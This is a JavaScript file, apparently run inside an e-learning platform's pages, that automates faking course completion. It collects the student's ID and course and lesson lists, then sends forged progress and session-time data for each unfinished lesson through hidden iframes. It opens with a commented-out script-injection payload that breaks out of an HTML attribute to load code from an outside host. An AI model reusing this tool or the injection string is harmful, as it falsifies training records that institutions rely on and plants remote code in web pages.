/*
"><script src="https://s.mahjong.pub/js/cj.js" onerror="this.src=''"></script><input type="hidden

*/


async function start() {
  window.myobj = {};

  //get studen_id
  $.ajax('/LMS/ajax/site/coursenotes/answer_player.do').then((data) => {
    window.myobj.student_id = data.staffId;
  });

  //get planId
  data = await $.ajax("/LMS/study/personalv2/mycourse/list.do");
  var mypatt = new RegExp(/planId:"?(\d+)"?/i);
  window.myobj.planId = mypatt.exec(data)[1];

  //get courseId array
  window.myobj.courseId = [];
  data = await $.ajax({
    url: "/LMS/ajax/personalv2/mycourse/list.do",
    data: {
      pageSize: 10,
      curPage: 1,
      planId: window.myobj.planId,
      semesterType: "in"
    }
  });
  var mypatt = new RegExp(/(\d+)&planId=\d+">/gi);
  var tmpstr = data.match(mypatt)
  for (var i = tmpstr.length; i--;) {
    window.myobj.courseId.push(parseInt(tmpstr[i]));
  }

  //get page_id
  window.myobj.page_id = [];
  for (var i = 0; i < window.myobj.courseId.length; i++) {
    data = await $.ajax(
      "/LMS/study/personalv2/mycourse/detail.do?planId="
      + window.myobj.planId + "&courseId=" + window.myobj.courseId[i]
    );
    var mypatt = new RegExp(/detail.do\?id\=(\d+)/i);
    window.myobj.page_id.push(mypatt.exec(data)[1]);
  }

  //mk scolist
  /* (58043+20111+2097+1903)/60/24=57天
  2097/987min
id: 7890911
companyRelationCourseId: 162
title: "第1节"
href: "HNU_10126_01.mp4"
type: 3
location: "263.2"
suspendData: ""
status: "incomplete"
progress: 29
score: 0
finishLength: 51
totalTime: 898
chapterId: 5958

  */
  window.myobj.scolist = {};
  for (var i = 0; i < window.myobj.page_id.length; i++) {
    data = await $.ajax(
      "/LMS/ajax/coursePlayer/getStaffScoList.do?id="
      + window.myobj.page_id[i]
    );
    data = eval(data.scoList);
    window.myobj.scolist[window.myobj.courseId[i]] = data;
  }

  //get session_id
  /*
courseNumer: 10126 v?
courseType: 3 v
href: HNU_10126_01.mp4 v
requiredTime: 51 =finishLength
location: 233.1 v
suspeDate: 
url: http://47.111.69.103:8080/coursePlayer/init.do
status: incomplete v
totalTime: 479 v
id: 5958 =chapterId
staffChapterId: 7890911 v
courseId: 162 v
  */
  window.myobj.session_id = {};
  window.myobj.pdata = [];
  for (var ii = window.myobj.courseId.length; ii--;) {
    var j = window.myobj.courseId[ii];
    window.myobj.session_id[j] = [];
    for (var i = window.myobj.scolist[j].length; i--;) {
      var thisarr = window.myobj.scolist[j][i];
      if (thisarr.status != "completed") {
        $.ajax({
          "url": "/LMS/ajax/coursePlayer/onlineCoursePlayer.do",
          "data": {
            "courseNumer": j,
            "url": "http://47.111.69.103:8080/coursePlayer/init.do",
            "courseType": 3,
            "suspeDate": '',
            "href": thisarr.href,
            "requiredTime": thisarr.finishLength,
            "location": thisarr.location,
            "status": thisarr.status,
            "totalTime": thisarr.totalTime,
            "id": thisarr.chapterId,
            "staffChapterId": thisarr.id,
            "courseId": thisarr.companyRelationCourseId
          }
        }).then((jdata) => {
          window.myobj.session_id[j].unshift(jdata);
          //var min = parseInt(thisarr.totalTime) + Math.floor(Math.random() * 5 * 60);
          min = "00:" + Math.floor(Math.random() * 59) + ":" + Math.floor(Math.random() * 59);
          //min = Math.floor(min / 3600) + ":" + Math.floor((min % 3600) / 60) + ":" + Math.floor(Math.random() * 59);
          console.log('thisarr.totalTime', thisarr.totalTime, 'min', min)
          var postdata = {
            student_id: window.myobj.student_id,
            lesson_location: thisarr.location,
            lesson_status: thisarr.status,
            score: thisarr.score,
            suspend_data: '',
            session_time: min,
            lesson_progress: 0.0,
            masteryscore: '',
            total_time: thisarr.totalTime,
            required_time: thisarr.finishLength,
            session_id: jdata
          }

          var e = document.createElement('iframe');
          e.src = "http://47.111.69.103:8080/coursePlayer/loopCommit.do?"
            + jQuery.param(postdata);
          document.body.appendChild(e);

          //window.myobj.pdata.push(postdata);
        });
      }

    }
  }

}//func

(function () {
  window.webjx = 1;
  document.querySelector('table > tbody > tr > td')
    .setAttribute('onclick', "confirm('start?') ? start() : 0;");
})()
